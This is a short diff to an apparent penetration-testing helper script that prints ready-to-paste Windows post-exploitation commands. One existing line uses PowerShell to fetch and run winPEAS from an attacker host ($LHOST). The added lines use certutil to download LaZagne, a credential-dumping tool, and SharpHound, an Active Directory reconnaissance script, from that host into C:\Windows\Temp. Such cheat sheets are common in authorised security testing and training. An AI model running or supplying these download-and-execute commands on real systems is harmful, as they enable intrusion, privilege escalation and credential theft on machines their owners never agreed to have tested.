@@ -70,6 +70,10 @@ echo
 echo "Winpeas"
 echo "iwr -uri http://$LHOST:$TOOLS_PORT/windows/winpeas/winPEASany.exe -Outfile C:\Windows\Temp\winpeas.exe | C:\Windows\Temp\winpeas.exe"
 echo
+echo "Tools"
+echo "certutil.exe -urlcache -f http://$LHOST:$TOOLS_PORT/windows/LaZagne.exe C:\Windows\Temp\LaZagne.exe"
+echo "certutil.exe -urlcache -f http://$LHOST:$TOOLS_PORT/windows/SharpHound.ps1 C:\Windows\Temp\SharpHound.ps1"
+echo
 echo
 
 echo '********** Linux **********'
